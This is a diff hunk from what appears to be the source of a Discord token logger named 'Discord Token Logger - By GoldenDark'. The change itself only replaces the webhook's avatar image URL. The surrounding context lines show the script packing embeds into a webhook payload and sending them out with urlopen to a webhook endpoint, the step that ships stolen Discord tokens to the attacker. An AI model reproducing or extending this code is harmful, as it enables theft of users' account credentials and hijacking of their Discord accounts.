@@ -153,7 +153,7 @@ def main():
         "content": "",
         "embeds": embeds,
         "username": "Discord Token Logger - By GoldenDark",
-        "avatar_url": "https://cdn.discordapp.com/attachments/429773787911946241/951212172527140894/logo.png"
+        "avatar_url": "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/649adf24-60c9-4b7c-8ccf-e828ce51825d/dddqxj0-12dc5989-6e8e-4a0f-bf9f-887a5db96b18.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOiIsImlzcyI6InVybjphcHA6Iiwib2JqIjpbW3sicGF0aCI6IlwvZlwvNjQ5YWRmMjQtNjBjOS00YjdjLThjY2YtZTgyOGNlNTE4MjVkXC9kZGRxeGowLTEyZGM1OTg5LTZlOGUtNGEwZi1iZjlmLTg4N2E1ZGI5NmIxOC5wbmcifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6ZmlsZS5kb3dubG9hZCJdfQ.kHjYfE48SYiPGR0M3GHDyRNbP8Iw87SumhIH7pjOKUo"
     }
     try:
         urlopen(Request("WEBHOOK", data=dumps(webhook).encode(), headers=getheaders()))
